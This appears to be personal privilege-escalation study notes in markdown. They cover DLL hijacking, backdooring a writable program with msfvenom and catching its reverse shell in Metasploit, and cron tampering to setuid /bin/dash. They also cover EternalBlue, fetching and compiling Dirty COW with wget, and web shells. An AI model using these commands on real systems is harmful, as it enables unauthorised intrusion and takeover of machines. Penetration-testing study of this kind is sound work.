# **Privillage Escalation**
---
## **DLL Hijacking**
- **Dynamic Link Library**
dll should use absolute path if not it exposes an exploit

            --------------------- app
            |                 |
            |                 |
            |                \/
            |                /\
        ------------         | 
        |malicious |         |
        |dll folder|      ------------
        ------------      |normal dll|
                          |folder    |
                          ------------

- ***as an engineer use full paths always***
---
## **Permissions Errors**
- **Evil Program**
    - Once inside of machine as a user.
    - Look for app with rights permissions (mod perms)
    - Modify app as evil app
        1. Obtain copy of app or exe
        2. Use MSFVenom to create evil version of app or exe.

        - `msfvenom -a x86 --platform <os> -x <exe file> -k -p <path to script> LHOST=<ip> LPORT=4444 -e <encode to be sneaky> -i 3 -b "\x00" -f <file type> -o  <evil app file>`
    - Start web server with python:

            user@host:~$ python -m SimpleHTTPServer 8888
    - Download url
    - Check Downloads folder
    - Rename to replace safe app 
    - Copy to proper foler
    - Fire up meta sploit to recieve info from app
            
            user@host:~$ msfconsole
            msf > use multi/handler
            msf exploit(multi/handler) > set payload <path to script>
            msf exploit(multi/handler) > set LHOST <ip>
            msf exploit(multi/handler) > exploit
    - Now listening
    - once session is open you can gain access.

- **Automation Tasks Weakness**
    - use a scheduled task to gain permissions
    - look for scheduled tasks:
        - linux: cat /etc/crontab (good start)
        - windows: task manager
        - mac: p files
    - echo "chmod u+s /bin/dash" >> file to tamper (use dash because bash will try to keep you from running root privs)

- **Sudo Weakness**
    - sudo -l (list out sudo pivs)
---
## **OS Exploitation**
- **Windows**
    - eternal blue
        - msfconsole
        - msf > nmap -Pn -n -p 445 ip
        - msf > search eternalblue
        - msf exploit(exploit/path) > set rhost=ip
        - msf exploit(exploit/path) > set LHOST=ATTAKING IP LPORT=4444
        - msf exploit(exploit/path) > exploit
        - bam
        - double bam

- **Linux**
    - Dirty Cow Exploit
        - searchsploit dirty COW
        - look through exploits
        - select exploit
        - save exploit as .c
        - set up python web server 8888
        - wget from web server/dirtycow.c
        - checkout source code
        - make necessary modifications
        - compile code
        - run code
---
## **WEB SHELLS**
- create python web server
- wget app
- browse to webshell